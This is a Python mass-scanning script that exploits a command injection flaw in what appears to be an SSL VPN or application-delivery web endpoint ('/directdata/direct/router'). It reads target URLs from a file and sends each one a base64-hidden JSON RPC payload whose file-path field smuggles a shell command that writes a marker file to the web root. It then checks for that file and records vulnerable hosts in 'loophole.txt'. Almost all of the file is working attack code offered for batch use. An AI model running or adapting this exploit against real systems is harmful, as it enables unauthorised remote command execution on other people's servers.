import re
import requests
import base64
import traceback
from requests.packages import urllib3
import queue
import threading


urllib3.disable_warnings()
task_queue = queue.Queue()
work_num = 5

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

def work(thread_id):

    while True:

        item = task_queue.get()

        if item is None:
            break
        
        savePeopleInformation(item)
        
        task_queue.task_done()
    
    print('thread {} exit'.format(thread_id))

def send_payload(url):

    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}
    payload = "eyJhY3Rpb24iOiJTU0xWUE5fUmVzb3VyY2UiLCJtZXRob2QiOiJkZWxldGVJbWFnZSIsImRhdGEiOlt7ImRhdGEiOlsiL3Zhci93d3cvaHRtbC9kLnR4dDsgZWNobyAnMScgPiAvdmFyL3d3dy9odG1sL2YxYWcudHh0Il19XSwidHlwZSI6InJwYyIsInRpZCI6MTcsImY4ODM5cDdycXRqIjoiPSJ9"
    
    payload = base64.b64decode(payload)
    

    try:
        print("[+]start scan......[+]")

        r = requests.post(url + '/directdata/direct/router', data=payload,headers=headers,timeout=5,verify=False)
    
        r = requests.get(url + '/f1ag.txt',timeout=5,verify=False)

        if "1" in r.text:

            print("[!]vul:" + url)
            
            return url
        else:

            return 0

    except Exception as e:

         print(e)
 
def remove_control_chars(s):

    control_chars = ''.join(map(chr, list(range(0,32)) + list(range(127,160))))

    control_char_re = re.compile('[%s]' % re.escape(control_chars))
    
    s = control_char_re.sub('', s)
    
    if 'http' not in s:

        s = 'http://' + s

    return s
 
def savePeopleInformation(url):
 
    newurl = send_payload(url)
 
    if newurl != 0:

        try:

            fw = open('loophole.txt', 'a')

            fw.write(newurl + '\n')

            fw.close()
        
        except Exception as e:

            print(e)


 
 
def main():
 
    fr = open('url.txt', 'r')
 
    lines = fr.readlines()
 
    for i in lines:

        i = i.strip()

        url = remove_control_chars(i)
 
        task_queue.put(url)
 
    threads = []

    for worker_id in range(work_num):
        threads.append(threading.Thread(target=work, args=(worker_id,)))

    for t in threads:
        t.setDaemon(True)
        t.start()

    task_queue.join()

    for _ in range(work_num):
        task_queue.put(None)

    for t in threads:
        t.join()


if __name__ == '__main__':
    main()